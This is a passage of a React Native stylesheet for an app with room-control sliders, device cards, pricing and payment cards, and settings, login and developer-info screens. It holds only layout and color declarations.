        color: 'rgba(255,255,255,0.4)',
        fontSize: 11,
        fontWeight: '600',
        marginTop: 6,
        letterSpacing: 0.5,
        textTransform: 'uppercase',
    },
    // Room Control
    roomHero: {
        ...StyleSheet.absoluteFillObject,
        height: '60%',
    },
    roomHeroOverlay: {
        ...StyleSheet.absoluteFillObject,
        backgroundColor: 'rgba(0,0,0,0.3)',
    },
    roomHeaderWrap: {
        position: 'relative',
        zIndex: 10,
    },
    roomHeader: {
        flexDirection: 'row',
        justifyContent: 'space-between',
        alignItems: 'center',
        paddingHorizontal: 24,
        paddingTop: 60,
    },
    roomHeaderTitle: {
        color: '#fff',
        fontSize: 20,
        fontWeight: '700',
    },
    sliderContainer: {
        flex: 1,
        alignItems: 'flex-end',
        justifyContent: 'center',
        paddingRight: 32,
    },
    verticalSlider: {
        width: 80,
        height: 260,
        borderRadius: 40,
        overflow: 'hidden',
        justifyContent: 'flex-end',
    },
    sliderFill: {
        backgroundColor: COLORS.primary,
        width: '100%',
        alignItems: 'center',
        paddingTop: 10,
        borderTopLeftRadius: 40,
        borderTopRightRadius: 40,
    },
    sliderHandle: {
        width: 40,
        height: 40,
        borderRadius: 20,
        backgroundColor: 'rgba(255,255,255,0.2)',
        alignItems: 'center',
        justifyContent: 'center',
    },
    sliderTextContainer: {
        position: 'absolute',
        bottom: 20,
        width: '100%',
        alignItems: 'center',
    },
    sliderPercentage: {
        color: '#fff',
        fontWeight: '700',
        fontSize: 18,
    },
    sliderLabel: {
        color: 'rgba(0,0,0,0.6)',
        fontSize: 10,
        fontWeight: '600',
    },
    deviceSheet: {
        borderTopLeftRadius: 48,
        borderTopRightRadius: 48,
        padding: 24,
        paddingTop: 16,
        borderBottomWidth: 0,
        height: '35%',
    },
    sheetHandle: {
        width: 40,
        height: 4,
        backgroundColor: 'rgba(255,255,255,0.2)',
        borderRadius: 2,
        alignSelf: 'center',
        marginBottom: 24,
    },
    deviceGrid: {
        flexDirection: 'row',
        gap: 16,
    },
    deviceCard: {
        flex: 1,
        borderRadius: 24,
        padding: 16,
        height: 140,
    },
    devicePercent: {
        color: '#fff',
        fontSize: 20,
        fontWeight: '700',
        marginBottom: 8,
    },
    deviceName: {
        color: '#fff',
        fontSize: 14,
        fontWeight: '600',
    },
    deviceStatus: {
        color: COLORS.textSecondary,
        fontSize: 10,
    },
    deviceToggle: {
        position: 'absolute',
        bottom: 16,
        right: 16,
        width: 48,
        height: 48,
        borderRadius: 24,
        paddingVertical: 0,
        paddingHorizontal: 0,
    },
    // Pricing & Payment Styles
    pricingCard: {
        borderRadius: 24,
        padding: 20,
        overflow: 'hidden',
    },
    pricingCardPopular: {
        borderColor: COLORS.primary,
        borderWidth: 1,
        backgroundColor: 'rgba(204,255,0,0.05)',
    },
    popularBadge: {
        position: 'absolute',
        top: 0,
        right: 0,
        backgroundColor: COLORS.primary,
        paddingHorizontal: 12,
        paddingVertical: 4,
        borderBottomLeftRadius: 12,
    },
    popularText: {
        color: '#fff',
        fontSize: 10,
        fontWeight: '900',
    },
    pricingRow: {
        flexDirection: 'row',
        alignItems: 'center',
        gap: 16,
    },
    pkgIconBox: {
        width: 48,
        height: 48,
        borderRadius: 14,
        backgroundColor: 'rgba(255,255,255,0.05)',
        alignItems: 'center',
        justifyContent: 'center',
    },
    pkgName: {
        color: '#fff',
        fontSize: 18,
        fontWeight: '700',
    },
    pkgDays: {
        color: 'rgba(255,255,255,0.4)',
        fontSize: 12,
        marginTop: 2,
    },
    pkgPrice: {
        color: COLORS.primary,
        fontSize: 18,
        fontWeight: '900',
    },
    pkgPriceFocus: {
        color: COLORS.primary,
        fontSize: 24,
        fontWeight: '900',
    },
    buyBtnSmall: {
        backgroundColor: COLORS.primary,
        paddingHorizontal: 12,
        paddingVertical: 6,
        borderRadius: 10,
        marginTop: 4,
    },
    buyBtnTextSmall: {
        color: '#fff',
        fontSize: 10,
        fontWeight: '900',
    },
    paymentMethodCard: {
        borderRadius: 20,
        padding: 16,
    },
    paymentMethodRow: {
        flexDirection: 'row',
        alignItems: 'center',
        gap: 16,
    },
    paymentMethodText: {
        color: '#fff',
        fontSize: 16,
        fontWeight: '600',
    },
    // Settings Styles
    settingsItem: {
        padding: 16,
        borderRadius: 20,
    },
    settingsRow: {
        flexDirection: 'row',
        alignItems: 'center',
        gap: 16,
    },
    settingsIconBox: {
        width: 48,
        height: 48,
        borderRadius: 24,
        alignItems: 'center',
        justifyContent: 'center',
    },
    settingsLabel: {
        color: '#fff',
        fontSize: 16,
        fontWeight: '600',
    },
    // Login Styles
    loginInputContainer: {
        flexDirection: 'row',
        alignItems: 'center',
        paddingHorizontal: 16,
        borderRadius: 16,
        marginBottom: 16,
        height: 56,
        borderWidth: 1,
        borderColor: 'rgba(255,255,255,0.05)',
    },
    loginInput: {
        flex: 1,
        color: '#fff',
        marginLeft: 12,
        fontSize: 16,
    },
    separator: {
        width: '100%',
        height: 1,
        backgroundColor: 'rgba(255,255,255,0.15)',
        marginVertical: 32,
    },
    // New Login Styles
    loginCard: {
        padding: 24,
        borderRadius: 32,
    },
    loginSectionTitle: {
        color: '#fff',
        fontSize: 18,
        fontWeight: '700',
        marginBottom: 20,
    },
    loginTitleSecondary: {
        color: 'rgba(255,255,255,0.7)',
        fontSize: 14,
        marginTop: 8,
        textAlign: 'center',
    },
    loginButton: {
        backgroundColor: COLORS.primary,
        flexDirection: 'row',
        alignItems: 'center',
        justifyContent: 'center',
        paddingVertical: 16,
        borderRadius: 100,
        marginTop: 8,
    },
    loginButtonText: {
        color: '#fff',
        fontSize: 14,
        fontWeight: '800',
        letterSpacing: 1,
    },
    loginFooterLink: {
        marginTop: 32,
        alignItems: 'center',
    },
    loginFooterText: {
        color: 'rgba(255,255,255,0.5)',
        fontSize: 14,
    },
    loginFooterLinkText: {
        color: COLORS.primary,
        fontWeight: '700',
    },
    // Missing About Dev Styles
    aboutDevContent: {
        padding: 24,
        alignItems: 'center',
    },
    aboutDevCard: {
        width: '100%',
        padding: 32,
        borderRadius: 32,
        alignItems: 'center',
    },
    aboutDevIconBox: {
        width: 80,
        height: 80,
        borderRadius: 40,
        backgroundColor: 'rgba(204,255,0,0.1)',
        alignItems: 'center',
        justifyContent: 'center',
        marginBottom: 24,
        borderWidth: 1,
        borderColor: 'rgba(204,255,0,0.2)',
    },
    aboutDevTitle: {
        color: '#fff',
        fontSize: 24,
        fontWeight: '700',
        marginBottom: 8,
    },
    aboutDevSubtitle: {
        color: COLORS.primary,
        fontSize: 14,
        fontWeight: '800',
        letterSpacing: 2,
    },
    aboutDevInfoSection: {
        width: '100%',
    }
});
